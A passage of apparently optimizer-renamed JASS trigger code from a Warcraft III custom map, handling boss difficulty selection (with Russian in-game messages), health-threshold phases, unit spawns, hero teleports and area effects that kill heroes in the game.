call SetUnitAbilityLevelSwapped($4130314A,K9,2)
else
endif
if Bh1() then
set d8[3]=1
call SetUnitInvulnerable(K5,false)
call ShowUnitShow(K5)
call PauseUnitBJ(false,K5)
call SetUnitOwner(K5,Player(11),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Ксерон|r")
call RemoveUnit(H1)
else
endif
if Bh2() then
set d8[3]=2
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса|r |c0000FF00Ксерон|r")
call UnitAddAbilityBJ($4130384C,K5)
call CreateNUnitsAtLoc(1,$6E303139,Player(11),GetRectCenter(i),bj_UNIT_FACING)
call RemoveUnit(H1)
call SetUnitInvulnerable(K5,false)
call ShowUnitShow(K5)
call PauseUnitBJ(false,K5)
call SetUnitOwner(K5,Player(11),true)
else
endif
if Bh3() then
set d8[2]=1
call SetUnitInvulnerable(Kv,false)
call ShowUnitShow(Kv)
call PauseUnitBJ(false,Kv)
call SetUnitOwner(Kv,Player(11),true)
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Матерь Пауков|r")
call RemoveUnit(Hz)
else
endif
if Bh4() then
set d8[2]=2
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса|r |c0000FF00Матерь Пауков|r")
call UnitAddAbilityBJ($4130384B,Kv)
call UnitAddAbilityBJ($41303050,Kv)
call UnitAddAbilityBJ($41303056,Kv)
call CreateNUnitsAtLoc(1,$6E303137,Player(11),GetRectCenter(a),bj_UNIT_FACING)
call RemoveUnit(Hz)
call SetUnitInvulnerable(Kv,false)
call ShowUnitShow(Kv)
call PauseUnitBJ(false,Kv)
call SetUnitOwner(Kv,Player(11),true)
else
endif
if Bh5() then
set d8[1]=2
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c00FF0000Выбран Сложный режим босса|r |c0000FF00Разрушитель Природы|r")
call UnitAddAbilityBJ($4130384A,K1)
call UnitAddAbilityBJ($41437670,K1)
call UnitAddAbilityBJ($41436374,K1)
call CreateNUnitsAtLoc(1,$6E303135,Player(11),GetRectCenter(Gb),bj_UNIT_FACING)
call RemoveUnit(Hy)
else
endif
if Bh6() then
set d8[1]=1
call QuestMessageBJ(GetPlayersAll(),bj_QUESTMESSAGE_REQUIREMENT,"|c0000FF00Выбран Легкий режим босса Разрушитель Природы|r")
call RemoveUnit(Hy)
else
endif
endfunction
function Bh8 takes nothing returns nothing
set d7=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(d7,EVENT_PLAYER_UNIT_SELL_ITEM)
call TriggerAddAction(d7,function Bh7)
endfunction
function Bh9 takes nothing returns nothing
call IssueImmediateOrder(GetEnumUnit(),"fanofknives")
endfunction
function BiB takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Tc[0])) then
return false
endif
return true
endfunction
function BiC takes nothing returns nothing
if BiB() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Tc[0]))
set Tc[0]=Tc[0]-25
set Vz=GetRandomLocInRect(EK)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(EK)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(EK)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(EK)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(EK)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
call TriggerSleepAction(2)
set SR=GetUnitsOfTypeIdAll($68303459)
call ForGroupBJ(SR,function Bh9)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BiD takes nothing returns nothing
set ee=CreateTrigger()
call TriggerRegisterUnitEvent(ee,Lr,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ee,function BiC)
endfunction
function BiE takes nothing returns nothing
call IssueImmediateOrder(GetEnumUnit(),"fanofknives")
endfunction
function BiF takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Tc[0])) then
return false
endif
return true
endfunction
function BiG takes nothing returns nothing
if BiF() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Tc[0]))
set Tc[0]=Tc[0]-25
set Vz=GetRandomLocInRect(Ey)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(Ey)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(Ey)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(Ey)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(Ey)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
call TriggerSleepAction(2)
set SR=GetUnitsOfTypeIdAll($68303459)
call ForGroupBJ(SR,function BiE)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BiH takes nothing returns nothing
set ef=CreateTrigger()
call TriggerRegisterUnitEvent(ef,Ls,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ef,function BiG)
endfunction
function BiI takes nothing returns nothing
call IssueImmediateOrder(GetEnumUnit(),"fanofknives")
endfunction
function BiJ takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Tc[0])) then
return false
endif
return true
endfunction
function BiK takes nothing returns nothing
if BiJ() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Tc[0]))
set Tc[0]=Tc[0]-25
set Vz=GetRandomLocInRect(FH)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(FH)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(FH)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(FH)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
set Vz=GetRandomLocInRect(FH)
call CreateNUnitsAtLoc(1,$68303459,Player(10),Vz,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
call TriggerSleepAction(2)
set SR=GetUnitsOfTypeIdAll($68303459)
call ForGroupBJ(SR,function BiI)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function BiL takes nothing returns nothing
set eg=CreateTrigger()
call TriggerRegisterUnitEvent(eg,Lo,EVENT_UNIT_DAMAGED)
call TriggerAddAction(eg,function BiK)
endfunction
function BiM takes nothing returns nothing
local location d2
call DisableTrigger(GetTriggeringTrigger())
set d2=GetUnitLoc(GetAttacker())
call CreateNUnitsAtLoc(1,$68303432,Player(10),d2,bj_UNIT_FACING)
call UnitApplyTimedLifeBJ(35.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(d2)
call TriggerSleepAction(20.)
call EnableTrigger(GetTriggeringTrigger())
set d2=null
endfunction
function BiN takes nothing returns nothing
set eh=CreateTrigger()
call TriggerRegisterUnitEvent(eh,Lr,EVENT_UNIT_ATTACKED)
call TriggerAddAction(eh,function BiM)
endfunction
function BiO takes nothing returns boolean
if not (GetUnitTypeId(GetTriggerUnit())==$68303432) then
return false
endif
if not (IsUnitAlly(GetKillingUnitBJ(),Player(0))==true) then
return false
endif
return true
endfunction
function BiP takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(11))==true
endfunction
function BiQ takes nothing returns nothing
call SetUnitLifePercentBJ(GetEnumUnit(),5.)
endfunction
function BiR takes nothing returns nothing
local location d2
local group Xx
call RemoveUnit(GetTriggerUnit())
set d2=GetUnitLoc(GetTriggerUnit())
set Xx=GetUnitsInRangeOfLocMatching(550.,d2,Condition(function BiP))
call ForGroupBJ(Xx,function BiQ)
call AddSpecialEffectLocBJ(d2,"Abilities\\Spells\\Orc\\WarStomp\\WarStompCaster.mdl")
call DestroyEffect(GetLastCreatedEffectBJ())
call DestroyGroup(Xx)
call RemoveLocation(d2)
set Xx=null
set d2=null
endfunction
function BiS takes nothing returns nothing
set ei=CreateTrigger()
call TriggerRegisterAnyUnitEventBJ(ei,EVENT_PLAYER_UNIT_DEATH)
call TriggerAddCondition(ei,Condition(function BiO))
call TriggerAddAction(ei,function BiR)
endfunction
function BiT takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303555
endfunction
function BiU takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function BiV takes nothing returns boolean
return GetBooleanAnd(BiT(),BiU())
endfunction
function BiW takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function BiX takes nothing returns boolean
if not (IsUnitAliveBJ(Wi[5])==true) then
return false
endif
if not (IsUnitAliveBJ(Wi[6])==true) then
return false
endif
return true
endfunction
function BiY takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303555
endfunction
function BiZ takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bia takes nothing returns boolean
return GetBooleanAnd(BiY(),BiZ())
endfunction
function Bib takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bic takes nothing returns boolean
if IsUnitAliveBJ(Wi[5])==true then
return true
endif
if IsUnitAliveBJ(Wi[6])==true then
return true
endif
return false
endfunction
function Bid takes nothing returns boolean
if not Bic() then
return false
endif
return true
endfunction
function Bie takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Tc[1])) then
return false
endif
return true
endfunction
function Bif takes nothing returns nothing
if Bie() then
call DisableTrigger(GetTriggeringTrigger())
if BiX() then
call RemoveUnit(Wi[6])
call RemoveUnit(Wi[5])
set SR=GetUnitsInRectMatching(Ey,Condition(function BiV))
call ForGroupBJ(SR,function BiW)
call DestroyGroup(SR)
call SetUnitLifePercentBJ(Ls,100)
set Tc[0]=75
set Tc[1]=80
set V0=GetRectCenter(Ey)
call SetUnitPositionLoc(Ls,V0)
call SetUnitOwner(Ls,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ls,true)
call RemoveLocation(V0)
else
call EnableTrigger(ek)
call EnableTrigger(el)
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Tc[1]))
set Tc[1]=Tc[1]-40
set Vz=GetRectCenter(Fy)
set Wi[5]=CreateUnitAtLoc(Player(10),$68303556,Vz,270.)
call RemoveLocation(Vz)
set Vz=GetRectCenter(Fx)
set Wi[6]=CreateUnitAtLoc(Player(10),$68303557,Vz,270.)
call RemoveLocation(Vz)
call CreateTextTagLocBJ("Я Вас жду. Время пошло!",GetUnitLoc(GetTriggerUnit()),0,15.,100,0.,50.,0)
call SetTextTagVelocityBJ(GetLastCreatedTextTag(),72.,90)
call SetTextTagPermanentBJ(GetLastCreatedTextTag(),false)
call SetTextTagLifespanBJ(GetLastCreatedTextTag(),3.)
call SetTextTagFadepointBJ(GetLastCreatedTextTag(),3.)
endif
call TriggerSleepAction(25.)
if Bid() then
call RemoveUnit(Wi[6])
call RemoveUnit(Wi[5])
set SR=GetUnitsInRectMatching(Ey,Condition(function Bia))
call ForGroupBJ(SR,function Bib)
call DestroyGroup(SR)
call SetUnitLifePercentBJ(Ls,100)
set Tc[0]=75
set Tc[1]=80
set V0=GetRectCenter(Ey)
call SetUnitPositionLoc(Ls,V0)
call SetUnitOwner(Ls,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ls,true)
call RemoveLocation(V0)
else
endif
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function Big takes nothing returns nothing
set ej=CreateTrigger()
call TriggerRegisterUnitEvent(ej,Ls,EVENT_UNIT_DAMAGED)
call TriggerAddAction(ej,function Bif)
endfunction
function Bih takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bii takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bij takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303555
endfunction
function Bik takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Bil takes nothing returns boolean
return GetBooleanAnd(Bij(),Bik())
endfunction
function Bim takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Bin takes nothing returns boolean
if not (CountUnitsInGroup(Th)<1) then
return false
endif
return true
endfunction
function Bio takes nothing returns nothing
set V0=GetRandomLocInRect(Fy)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
set Th=GetUnitsInRectMatching(Ey,Condition(function Bii))
if Bin() then
set SR=GetUnitsInRectMatching(Ey,Condition(function Bil))
call ForGroupBJ(SR,function Bim)
call DestroyGroup(SR)
call SetUnitLifePercentBJ(Ls,100)
set Tc[0]=75
set Tc[1]=60
set V0=GetRectCenter(Ey)
call SetUnitPositionLoc(Ls,V0)
call SetUnitOwner(Ls,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ls,true)
else
endif
call DestroyGroup(Th)
endfunction
function Bip takes nothing returns nothing
set ek=CreateTrigger()
call DisableTrigger(ek)
call TriggerRegisterEnterRectSimple(ek,Fq)
call TriggerAddCondition(ek,Condition(function Bih))
call TriggerAddAction(ek,function Bio)
endfunction
function Biq takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bir takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bis takes nothing returns boolean
return GetUnitTypeId(GetFilterUnit())!=$6E303555
endfunction
function Bit takes nothing returns boolean
return IsUnitEnemy(GetFilterUnit(),Player(0))==true
endfunction
function Biu takes nothing returns boolean
return GetBooleanAnd(Bis(),Bit())
endfunction
function Biv takes nothing returns nothing
call RemoveUnit(GetEnumUnit())
endfunction
function Biw takes nothing returns boolean
if not (CountUnitsInGroup(Th)<1) then
return false
endif
return true
endfunction
function Bix takes nothing returns nothing
set V0=GetRandomLocInRect(Fx)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
set Th=GetUnitsInRectMatching(Ey,Condition(function Bir))
if Biw() then
set SR=GetUnitsInRectMatching(Ey,Condition(function Biu))
call ForGroupBJ(SR,function Biv)
call DestroyGroup(SR)
call SetUnitLifePercentBJ(Ls,100)
set Tc[0]=75
set Tc[1]=60
set V0=GetRectCenter(Ey)
call SetUnitPositionLoc(Ls,V0)
call SetUnitOwner(Ls,Player(PLAYER_NEUTRAL_PASSIVE),true)
call SetUnitInvulnerable(Ls,true)
else
endif
call DestroyGroup(Th)
endfunction
function Biy takes nothing returns nothing
set el=CreateTrigger()
call DisableTrigger(el)
call TriggerRegisterEnterRectSimple(el,Fr)
call TriggerAddCondition(el,Condition(function Biq))
call TriggerAddAction(el,function Bix)
endfunction
function Biz takes nothing returns boolean
if not (IsUnitType(GetTriggerUnit(),UNIT_TYPE_HERO)==true) then
return false
endif
return true
endfunction
function Bi0 takes nothing returns nothing
set V0=GetRectCenter(Ey)
call SetUnitPositionLoc(GetTriggerUnit(),V0)
call PanCameraToTimedLocForPlayer(GetOwningPlayer(GetTriggerUnit()),V0,0)
call RemoveLocation(V0)
endfunction
function Bi1 takes nothing returns nothing
set em=CreateTrigger()
call TriggerRegisterEnterRectSimple(em,Fw)
call TriggerRegisterEnterRectSimple(em,Fz)
call TriggerAddCondition(em,Condition(function Biz))
call TriggerAddAction(em,function Bi0)
endfunction
function Bi2 takes nothing returns nothing
call PauseUnit(GetEnumUnit(),false)
set Vz=GetUnitLoc(GetTriggerUnit())
call IssuePointOrderLocBJ(GetEnumUnit(),"silence",Vz)
call RemoveLocation(Vz)
endfunction
function Bi3 takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Tc[2])) then
return false
endif
return true
endfunction
function Bi4 takes nothing returns nothing
if Bi3() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Tc[2]))
set Tc[2]=Tc[2]-10
set Vz=GetRandomLocInRect(FH)
call CreateNUnitsAtLoc(1,$68303153,Player(10),Vz,bj_UNIT_FACING)
call PauseUnit(GetLastCreatedUnit(),true)
call CreateNUnitsAtLoc(1,$68303349,Player(0),Vz,bj_UNIT_FACING)
call SetUnitFlyHeight(GetLastCreatedUnit(),250.,99999.)
call SetUnitTimeScale(GetLastCreatedUnit(),.33)
call UnitApplyTimedLifeBJ(3.,$42544C46,GetLastCreatedUnit())
call RemoveLocation(Vz)
call TriggerSleepAction(3.)
set SR=GetUnitsOfTypeIdAll($68303153)
call ForGroupBJ(SR,function Bi2)
call DestroyGroup(SR)
call EnableTrigger(GetTriggeringTrigger())
else
endif
endfunction
function Bi5 takes nothing returns nothing
set en=CreateTrigger()
call TriggerRegisterUnitEvent(en,Lo,EVENT_UNIT_DAMAGED)
call TriggerAddAction(en,function Bi4)
endfunction
function Bi6 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bi7 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bi8 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bi9 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjB takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjC takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjD takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjE takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjF takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjG takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjH takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjI takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjJ takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjK takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjL takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjM takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjN takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjO takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjP takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjQ takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjR takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjS takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjT takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjU takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjV takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjW takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjX takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BjY takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BjZ takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bja takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjb takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjc takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjd takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bje takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjf takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjg takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjh takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bji takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjj takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjk takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjl takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjm takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjn takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjo takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjp takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjq takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjr takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjs takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjt takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bju takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjv takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjw takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjx takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bjy takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bjz takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bj0 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bj1 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bj2 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bj3 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bj4 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bj5 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bj6 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bj7 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function Bj8 takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function Bj9 takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BkB takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BkC takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BkD takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BkE takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BkF takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BkG takes nothing returns boolean
return IsUnitType(GetFilterUnit(),UNIT_TYPE_HERO)==true
endfunction
function BkH takes nothing returns nothing
call KillUnit(GetEnumUnit())
endfunction
function BkI takes nothing returns boolean
if not (GetUnitLifePercent(GetTriggerUnit())<=I2R(Tc[3])) then
return false
endif
return true
endfunction
function BkJ takes nothing returns nothing
if BkI() then
call DisableTrigger(GetTriggeringTrigger())
call SetUnitLifePercentBJ(GetTriggerUnit(),I2R(Tc[3]))
set Tc[3]=Tc[3]-20
set V0=GetRectCenter(FH)
call SetUnitPositionLocFacingBJ(GetTriggerUnit(),V0,bj_UNIT_FACING)
call PauseUnit(GetTriggerUnit(),true)
call SetUnitInvulnerable(Lo,true)
call RemoveLocation(V0)
call TriggerSleepAction(2.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bi6))
call ForGroupBJ(SR,function Bi7)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function Bi8))
call ForGroupBJ(SR,function Bi9)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjB))
call ForGroupBJ(SR,function BjC)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjD))
call ForGroupBJ(SR,function BjE)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,600.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjF))
call ForGroupBJ(SR,function BjG)
call DestroyGroup(SR)
call RemoveLocation(Vz)
set Vz=PolarProjectionBJ(V0,900.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
set SR=GetUnitsInRangeOfLocMatching(300.,Vz,Condition(function BjH))
call ForGroupBJ(SR,function BjI)
call DestroyGroup(SR)
call RemoveLocation(Vz)
call RemoveLocation(V0)
call TriggerSleepAction(1.)
call SetUnitFacing(GetTriggerUnit(),GetUnitFacing(GetTriggerUnit())+30.)
set V0=GetUnitLoc(GetTriggerUnit())
set Vz=PolarProjectionBJ(V0,300.,GetUnitFacing(GetTriggerUnit()))
call AddSpecialEffectLocBJ(Vz,"war3mapImported\\DarkNova.mdx")
call DestroyEffect(GetLastCreatedEffectBJ())
